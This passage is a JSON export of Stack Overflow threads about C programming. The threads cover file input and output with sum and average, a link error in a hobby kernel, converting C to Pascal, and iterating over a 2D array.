\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 2384, "user_id": 4624683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39130cd702675dc4f741e62e64479eb6?s=128&d=identicon&r=PG&f=1", "display_name": "DBug", "link": "https://stackoverflow.com/users/4624683/dbug"}, "edited": false, "score": 0, "creation_date": 1449681331, "post_id": 34184826, "comment_id": 56116075, "body": "You should read it line by line, parse out numbers, compute sum and avg, then write out entire result as a line."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1449681339, "post_id": 34184826, "comment_id": 56116085, "body": "<a href=\"http://www.cprogramming.com/tutorial/cfileio.html\" rel=\"nofollow noreferrer\">cprogramming.com/tutorial/cfileio.html</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449681875, "post_id": 34184826, "comment_id": 56116464, "body": "Functions <code>read()</code> and <code>write()</code> and their cousins are used for binary files. Reading a text file would be better using <code>fgets()</code> and analysing the contents of each line, then outputting that line with the extra fields you calculate. Bear in mind that <code>fgets()</code> retains any <code>newline</code>, which you&#39;ll have to remove if you want to append text to that line."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 5564679, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11800f1cc53f72587e76b5f75112bcb3?s=128&d=identicon&r=PG&f=1", "display_name": "luke davis", "link": "https://stackoverflow.com/users/5564679/luke-davis"}, "edited": false, "score": 0, "creation_date": 1449688200, "post_id": 34185570, "comment_id": 56120367, "body": "thank you for answer!! can I ask one more thing? how to conver this code to low-level?? thanks"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 19, "user_id": 5564679, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11800f1cc53f72587e76b5f75112bcb3?s=128&d=identicon&r=PG&f=1", "display_name": "luke davis", "link": "https://stackoverflow.com/users/5564679/luke-davis"}, "edited": false, "score": 0, "creation_date": 1449688794, "post_id": 34185570, "comment_id": 56120685, "body": "Oooh! Funnily enough <a href=\"http://stackoverflow.com/questions/34186884/how-to-convert-high-level-to-low-level-in-c-language\">another question</a> has ripped off this answer and wants to go low level too. Please give me some credit for my effort."}, {"owner": {"reputation": 19, "user_id": 5564679, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11800f1cc53f72587e76b5f75112bcb3?s=128&d=identicon&r=PG&f=1", "display_name": "luke davis", "link": "https://stackoverflow.com/users/5564679/luke-davis"}, "edited": false, "score": 0, "creation_date": 1449689059, "post_id": 34185570, "comment_id": 56120823, "body": "I accepted your answer. I&#39;m not good at Eng. sorry for everything."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 19, "user_id": 5564679, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11800f1cc53f72587e76b5f75112bcb3?s=128&d=identicon&r=PG&f=1", "display_name": "luke davis", "link": "https://stackoverflow.com/users/5564679/luke-davis"}, "edited": false, "score": 0, "creation_date": 1449689111, "post_id": 34185570, "comment_id": 56120841, "body": "Thank you for the vote, even thought the answer is not &quot;low level&quot;, at least you have working code to go on from."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 1, "last_activity_date": 1449683294, "creation_date": 1449683294, "answer_id": 34185570, "question_id": 34184826, "link": "https://stackoverflow.com/questions/34184826/low-level-file-input-output-calculate-sum-and-average/34185570#34185570", "title": "low level file input output calculate &quot;sum&quot; and &quot;average&quot;", "body": "<p>Functions <code>read()</code> and <code>write()</code> and their cousins are used for binary files. Reading a text file would be better using <code>fgets()</code> and analysing the contents of each line, then outputting that line with the extra fields you calculate. Bear in mind that <code>fgets()</code> retains any <code>newline</code>, which has to be removed before appending text to that line.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define LLEN 100\n\nint main(void)\n{\n    FILE *inf, *outf;\n    int val1, val2, val3, sum;\n    char buff[LLEN];\n\n    if((inf = fopen(\"input.txt\", \"rt\")) == NULL) {\n        perror(\"Can't open file input.txt\");\n        exit(1);\n    }\n    if((outf = fopen(\"output.txt\", \"wt\")) == NULL) {\n        perror(\"Can\\t open file output.txt\");\n        exit(1);\n    }\n\n    if(fgets(buff, LLEN, inf) == NULL) {            // read the header\n        perror(\"Cannot read header line\");\n        exit(1);\n    }\n    buff [ strcspn(buff, \"\\r\\n\") ] = '\\0';          // truncate any newline\n    fprintf(outf, \"%s sum     average\\n\", buff);    // write expanded header line\n\n    while(fgets(buff, LLEN, inf) != NULL) {         // read each line\n        buff [ strcspn(buff, \"\\r\\n\") ] = '\\0';      // truncate any newline\n        if(sscanf(buff, \"%*s%d%d%d\", &amp;val1, &amp;val2, &amp;val3) != 3) {   // ignore ID\n            perror(\"Cannot convert fields\");\n            exit(1);\n        }\n        sum = val1 + val2 + val3;\n        fprintf(outf, \"%s%9d%7d \\n\", buff, sum, sum/3);\n    }\n\n    if (fclose(outf))\n        perror(\"Unable to close output file\");\n    fclose(inf); \n    return 0;\n}\n</code></pre>\n\n<p>Output file:</p>\n\n<pre><code>ID              UNIX    C Language      Network sum     average\n20150001        98      95              97      290     96 \n20150002        84      88              90      262     87 \n</code></pre>\n\n<p>Incidentally your average was incorrect on the last line!</p>\n"}], "owner": {"reputation": 19, "user_id": 5564679, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/11800f1cc53f72587e76b5f75112bcb3?s=128&d=identicon&r=PG&f=1", "display_name": "luke davis", "link": "https://stackoverflow.com/users/5564679/luke-davis"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 0, "closed_date": 1449699892, "accepted_answer_id": 34185570, "answer_count": 1, "score": -7, "last_activity_date": 1449683294, "creation_date": 1449680999, "question_id": 34184826, "link": "https://stackoverflow.com/questions/34184826/low-level-file-input-output-calculate-sum-and-average", "closed_reason": "Needs details or clarity", "title": "low level file input output calculate &quot;sum&quot; and &quot;average&quot;", "body": "<p>this is my code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;fcntl.h&gt;\n#include&lt;sys/types.h&gt;\n#include&lt;sys/stat.h&gt;\n\n#define BUFFERSIZE 512\nint main()\n{\n        int infd;\n        int bytes;\n        int i;\n        int outfd;\n        char buffer[BUFFERSIZE];\n\n        if((infd = open(\"input.txt\", O_RDONLY)) &lt;0)\n        {\n                perror(\"Can't open file d11-9.in\");\n        }\n        if((outfd = open(\"output.txt\", O_CREAT|O_WRONLY, S_IWRITE))&lt;0)\n        {\n                printf(\"Can\\t open file output.txt\");\n        }\n\n        while((bytes = read (infd, buffer, BUFFERSIZE))&gt;0)\n        {\n                for(i=0;i&lt;bytes; ++i)\n                {\n                        putchar(buffer[i]);\n                }\n                write(outfd, buffer, bytes);\n        }\n        close(infd); \n        close(outfd);\n        return 0;\n}      \n</code></pre>\n\n<p>this is input.txt</p>\n\n<pre><code>ID              UNIX    C Language      Network\n20150001        98      95              97\n20150002        84      88              90\n</code></pre>\n\n<p>this is output.txt</p>\n\n<pre><code>ID              UNIX    C Language      Networ  sum     average\n20150001        98      95              97      290     96\n20150002        84      88              90      262     84\n</code></pre>\n\n<p>I want to code read input.txt and calculate sum and average!!\nmake like output.txt</p>\n\n<p>I don't know how to code\npls give me a hand!!</p>\n"}, {"tags": ["c", "gcc", "linker", "kernel", "cross-compiling"], "answers": [{"tags": [], "owner": {"reputation": 18705, "user_id": 204046, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1ba8c6378dfdb51d5eeef228e92155cf?s=128&d=identicon&r=PG", "display_name": "Richard Pennington", "link": "https://stackoverflow.com/users/204046/richard-pennington"}, "is_accepted": true, "score": 1, "last_activity_date": 1449690829, "creation_date": 1449690829, "answer_id": 34187816, "question_id": 34184743, "link": "https://stackoverflow.com/questions/34184743/kernel-compiles-but-wont-link-with-unistd-h-reference/34187816#34187816", "title": "Kernel compiles but won&#39;t link with unistd.h reference", "body": "<p>Including unistd.h just tells the compiler about the things (functions, etc.) defined in a library. It describes the interface to the library but not the implementation of the libraries functionality.</p>\n\n<p>That's why your program compiles. unistd.h has a declaration of sleep() in it. It probably looks something like this:</p>\n\n<pre><code>unsigned sleep(unsigned);\n</code></pre>\n\n<p>You can look at it, it's a text file.</p>\n\n<p>The problem is that when you try to link, nothing defines sleep(). Normally sleep() and other standard functions exist in a precompiled library. Something with a name like libc.a The .a file is an archive containing object files that implement the library's functionality which the linker can link with your object files to resolve references to things like sleep().</p>\n\n<p>The reason that stddef.h stdint.h work is that they primarily define types and macros that are used at compile time but don't need any additional object code to be lined in at link time.</p>\n\n<p>Your link line doesn't include any libraries. I suspect that's because you don't have any for your bare-metal environment.</p>\n\n<p>You have a couple of options. You could try to port a preexisting library to work in your environment, or you can write your own sleep() function.</p>\n\n<p>You can take a look at <a href=\"http://ellcc.org\" rel=\"nofollow\">ELLCC</a> which is one (of several) cross development tool chains that provide libraries. ELLCC's bare-metal libraries are a work in progress, but looking at the <a href=\"http://ellcc.org/blog/?tag=elk\" rel=\"nofollow\">ELK blog posts</a> might give you some ideas.</p>\n"}], "owner": {"reputation": 627, "user_id": 4433163, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hv9yk.jpg?s=128&g=1", "display_name": "scubasteve623", "link": "https://stackoverflow.com/users/4433163/scubasteve623"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 658, "favorite_count": 0, "accepted_answer_id": 34187816, "answer_count": 1, "score": 0, "last_activity_date": 1449690829, "creation_date": 1449680765, "question_id": 34184743, "link": "https://stackoverflow.com/questions/34184743/kernel-compiles-but-wont-link-with-unistd-h-reference", "title": "Kernel compiles but won&#39;t link with unistd.h reference", "body": "<p>I'm writing a small kernel that has keyboard/cursor support. Everything works great until I add a function from unistd.h</p>\n\n<p>kernel.c</p>\n\n<pre><code>#include \"keyboard_map.h\"\n#include \"keyboard.c\"\n#include \"video.c\"\n#include &lt;unistd.h&gt;\n\nvoid kmain(void)\n{\n    terminal_initialize();\n    terminal_writestring(\"Hello, kernel World!\\n\");\n    idt_init();\n    kb_init();\n    kprint_newline();\n    writeSector();\n    sleep(1);\n    unsigned char c = readSector2();\n    kprint((const char *)c);\n\n    while(1);\n}\n</code></pre>\n\n<p>kernel.asm</p>\n\n<pre><code>bits 32\n\n%define     COLS    80\n\nsection .text\n\n    ;multiboot spec\n\n    align 4\n\n    dd 0x1BADB002              ;magic\n\n    dd 0x00                    ;flags\n\n    dd - (0x1BADB002 + 0x00)   ;checksum. m+f+c should be zero\n\n\n\n\nglobal start\n\nglobal keyboard_handler\n\nglobal read_port\n\nglobal write_port\n\nglobal load_idt\n\n\nextern kmain        ;this is defined in the c file\n\nextern keyboard_handler_main\n\n\n\nread_port:\n\nmov edx, [esp + 4]\n\n        ;al is the lower 8 bits of eax\n\nin al, dx   ;dx is the lower 16 bits of edx\n\nret\n\n\n\n\nwrite_port:\n\nmov   edx, [esp + 4]\n\nmov   al, [esp + 4 + 4]\n\nout   dx, al\n\nret\n\n\n\n\nload_idt:\n\nmov edx, [esp + 4]\n\nlidt [edx]\n\nsti                 ;turn on interrupts\n\nret\n\n\n\n\nkeyboard_handler:                 \n\ncall    keyboard_handler_main\n\niretd\n\n\n\n\nstart:\n\ncli                 ;block interrupts\n\nmov esp, stack_space\n\ncall kmain\n\nhlt                 ;halt the CPU\n\n\n\n\nsection .bss\n\nresb 8192; 8KB for stack\n\nstack_space:\n</code></pre>\n\n<p>link.ld</p>\n\n<pre><code>OUTPUT_FORMAT(elf32-i386)\n\nENTRY(start)\n\nSECTIONS\n\n {\n\n   . = 0x100000;\n\n   .text : { *(.text) }\n\n   .data : { *(.data) }\n\n   .bss  : { *(.bss)  }\n\n }\n</code></pre>\n\n<p>I'm compiling it via terminal with a gcc cross compiler, and running it on qemu</p>\n\n<pre><code>nasm -f elf /Users/par/Desktop/kernel.asm -o kasm.o\n/usr/local/gcc-4.8.1-for-linux32/bin/i586-pc-linux-gcc -m32 -c -std=c99     /Users/par/Documents/HelloC/HelloC/kernel.c -o kc.o\n/usr/local/gcc-4.8.1-for-linux32/bin/i586-pc-linux-ld -m elf_i386 -T /Users/par/Desktop/link.ld -o kernel kasm.o kc.o\nqemu-system-i386 -kernel kernel\n</code></pre>\n\n<p>I'm new to c programming so hopefully this is an easy question for someone out there. There are several other c files in the project, but I'm confident the problem has got to be somewhere above. Again everything works if the unistd.h and sleep() are removed, but will create an error that says \"Undefined reference to function sleep() in kc.o\" when trying to link with that reference.</p>\n\n<p>Also these references work fine elsewhere in the project...   </p>\n\n<pre><code> #include &lt;stddef.h&gt; \n #include &lt;stdint.h&gt;  \n</code></pre>\n\n<p>...which further confuses me why unistd.h won't link... but will compile.</p>\n"}, {"tags": ["c", "delphi", "pascal"], "comments": [{"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1449681009, "post_id": 34184419, "comment_id": 56115851, "body": "You have learnt how to ask questions here, but not yet how to answer them. Please can I ask you to read this, and apply it to your previous questions: <a href=\"http://meta.stackexchange.com/questions/5234/how-does-accepting-an-answer-work\" title=\"how does accepting an answer work\">meta.stackexchange.com/questions/5234/&hellip;</a>"}, {"owner": {"reputation": 58446, "user_id": 84704, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/aEXJK.png?s=128&g=1", "display_name": "Warren  P", "link": "https://stackoverflow.com/users/84704/warren-p"}, "edited": false, "score": 0, "creation_date": 1449690482, "post_id": 34184419, "comment_id": 56121625, "body": "Actually looking at Flz&#39;s history he/she has NOT learned to ask questions, other than bad questions. More effort on your part is required, FLZ."}], "answers": [{"comments": [{"owner": {"reputation": 27437, "user_id": 95954, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/iD0qO.png?s=128&g=1", "display_name": "Rudy Velthuis", "link": "https://stackoverflow.com/users/95954/rudy-velthuis"}, "edited": false, "score": 0, "creation_date": 1449702618, "post_id": 34184546, "comment_id": 56127906, "body": "I find it a bit sad that each time I look for something basic like operator precedence or similar, <b>in C</b>, I often land on a C++ reference page."}], "tags": [], "owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "is_accepted": false, "score": 2, "last_activity_date": 1449680167, "creation_date": 1449680167, "answer_id": 34184546, "question_id": 34184419, "link": "https://stackoverflow.com/questions/34184419/convert-c-to-pascal/34184546#34184546", "title": "Convert C to Pascal", "body": "<p>This is not really a Delphi or Pascal question. It's a question about operator precedence in C. There are many references that will tell you about that. For example: <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow\">http://en.cppreference.com/w/c/language/operator_precedence</a>. </p>\n\n<p>The key point is that <code>!=</code> has higher precedence than <code>&amp;&amp;</code>. So the expression</p>\n\n<pre><code>Length &amp;&amp; FileBase != NULL\n</code></pre>\n\n<p>has the same meaning as</p>\n\n<pre><code>Length &amp;&amp; (FileBase != NULL)\n</code></pre>\n\n<p>Since in C values are regarded as true if they are non-zero, in Delphi/Pascal this expression would be:</p>\n\n<pre><code>(Length &lt;&gt; 0) and (FileBase &lt;&gt; nil)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1449680806, "post_id": 34184547, "comment_id": 56115702, "body": "It&#39;s pretty clear that the asker has extracted the declarations to show us the types, but omitted the initialization/assignment of the variables.  I edited the question, and your answer, to reflect that."}], "tags": [], "owner": {"reputation": 12296, "user_id": 452752, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/a68d17cbd12e477e4a67745bd5b2452b?s=128&d=identicon&r=PG", "display_name": "Nickolay Olshevsky", "link": "https://stackoverflow.com/users/452752/nickolay-olshevsky"}, "is_accepted": false, "score": 1, "last_activity_date": 1449680762, "last_edit_date": 1449680762, "creation_date": 1449680171, "answer_id": 34184547, "question_id": 34184419, "link": "https://stackoverflow.com/questions/34184419/convert-c-to-pascal/34184547#34184547", "title": "Convert C to Pascal", "body": "<p>You are right \u2013 it should be translated as <code>if (Length &lt;&gt; 0) and (FileBase &lt;&gt; nil)</code>.</p>\n"}], "owner": {"reputation": 117, "user_id": 2642854, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e23d50b802458729539e52d3185cdfab?s=128&d=identicon&r=PG", "display_name": "Flz", "link": "https://stackoverflow.com/users/2642854/flz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1154, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449680762, "creation_date": 1449679863, "last_edit_date": 1449680328, "question_id": 34184419, "link": "https://stackoverflow.com/questions/34184419/convert-c-to-pascal", "title": "Convert C to Pascal", "body": "<p>I am converting a code written in C to Pascal. I got doubt in a part that seems to be simple but generated a doubt!</p>\n\n<pre><code>int Length = ...;  \nvoid *FileBase = ...;  \nif (Length &amp;&amp; FileBase != NULL)\n    ....\n</code></pre>\n\n<p>The above line with the condition \"if\", it means \"Length\" and \"Filebase\" are respectively different from \"0\" and \"Null\"?</p>\n\n<p>it is the same as <strong>if (Length &lt;> 0) and (FileBase &lt;> Nil) then</strong> ???</p>\n"}, {"tags": ["c", "multidimensional-array"], "comments": [{"owner": {"reputation": 13042, "user_id": 2374028, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/nJ7ED.png?s=128&g=1", "display_name": "Charles Clayton", "link": "https://stackoverflow.com/users/2374028/charles-clayton"}, "edited": false, "score": 0, "creation_date": 1449679644, "post_id": 34184212, "comment_id": 56114934, "body": "I don&#39;t know where you think you should be getting the extra <code>1</code> from. You&#39;re iterating diagonally through the arrays. <code>arr[0][0]</code> is the top left, so it&#39;s <code>1+1=2</code>. Then <code>arr[1][1]</code> is the second element of the second array, so it&#39;s <code>1+1=2</code>. Then <code>arr[2][2]</code> is the third element of the third array, so it&#39;s <code>4+4=3</code>. Then <code>3+3=6</code>. That&#39;s why you&#39;re getting the output you&#39;re getting."}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449682563, "post_id": 34184212, "comment_id": 56116915, "body": "What is many supposed to contain?"}], "answers": [{"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 1, "creation_date": 1449681592, "post_id": 34184487, "comment_id": 56116254, "body": "It wasn&#39;t me, but you should read the Question =&gt;&gt;  &quot;I have the following program <code>which reads a 2D arrays and adds its values in another array.</code>&quot;"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449681874, "post_id": 34184487, "comment_id": 56116461, "body": "and the question is not about how to do it but, about the output and why is it so"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "reply_to_user": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449682103, "post_id": 34184487, "comment_id": 56116626, "body": "@ch3rub7 I read it as the OP was confused about how to iterate over the loop, I like your answer though :) Ive edited mine hope that helps someone"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1449682284, "post_id": 34184487, "comment_id": 56116736, "body": "@RyanFitzpatrick OP needs the output to be: <code>3, 3, 9, 7</code> and not <code>15 12 15 17</code>"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1449682533, "post_id": 34184487, "comment_id": 56116892, "body": "@Michi Does the OP need it to be 3,3,9,7? Or do they think that&#39;s the correct output? Did they ever specify what many is supposed to contain?"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1449682780, "post_id": 34184487, "comment_id": 56117045, "body": "@RyanFitzpatrick OP said that he expected that output to be <code>3, 3, 9, 7</code>, why should be that output I have no ideas. He doesn&#39;t explain too much."}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1449682868, "post_id": 34184487, "comment_id": 56117089, "body": "@Michi I&#39;ve commented on the question asking the OP to explain, if they respond i&#39;ll update my answer :)"}], "tags": [], "owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "is_accepted": false, "score": 0, "last_activity_date": 1449681754, "last_edit_date": 1449681754, "creation_date": 1449680022, "answer_id": 34184487, "question_id": 34184212, "link": "https://stackoverflow.com/questions/34184212/how-to-read-2d-arrays-in-c/34184487#34184487", "title": "How to read 2D arrays in C?", "body": "<p>You need 2 loops to iterate through your 2D array</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n\n    int main() {\n        int arr[4][5] = {{1,2,3,4,5},\n                         {3,1,1,5,2},\n                         {4,1,4,1,5},\n                         {2,5,3,3,4}};\n        int many[4];\n        int i;\n        int j;\n        for(i=0;i&lt;4;i++)\n        {\n            many[i] = 0;\n            for(j=0;j&lt;5;j++)\n            {\n                many[i] += arr[i][j];\n            }\n            printf(\"%d\\n\", many[i]);\n        }\n    }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449682026, "post_id": 34184607, "comment_id": 56116577, "body": "why are you not adding the [i+1], I mean you said first element of the many array is 2 1+1=2, but why you did not add the 1 that was there before?"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449682197, "post_id": 34184607, "comment_id": 56116686, "body": "<b>but why you did not add the 1 that was there before?</b> which 1 are you speaking about?? @Batool"}, {"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449682364, "post_id": 34184607, "comment_id": 56116801, "body": "I am asking about the entire output. i = j[i][i] + j[i][i+1]; we have i+1 in the second j, so should we have i which is 1 for the first repeat add to 1 in that number becomes 2 and 3 in total I mean j[1] + j[2] = 3"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449682497, "post_id": 34184607, "comment_id": 56116870, "body": "man once look at your code it doesn&#39;t have <code>arr[i][i]+arr[i][i+1]</code> instead it has <code>arr[i][i]+arr[i][i]</code> @Batool"}, {"owner": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449683085, "post_id": 34184607, "comment_id": 56117215, "body": "oh sorry, that was a typing mistake. There should have been [i+1], but I thought I had it there. Sorry"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "reply_to_user": {"reputation": 81, "user_id": 5442643, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/297e2eaaa08461343ea526c6764d1f85?s=128&d=identicon&r=PG&f=1", "display_name": "Batool", "link": "https://stackoverflow.com/users/5442643/batool"}, "edited": false, "score": 0, "creation_date": 1449683203, "post_id": 34184607, "comment_id": 56117294, "body": "but then too you&#39;ll end up with different output not 3,3,9,7 you&#39;ll get 3,2,5,7"}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": 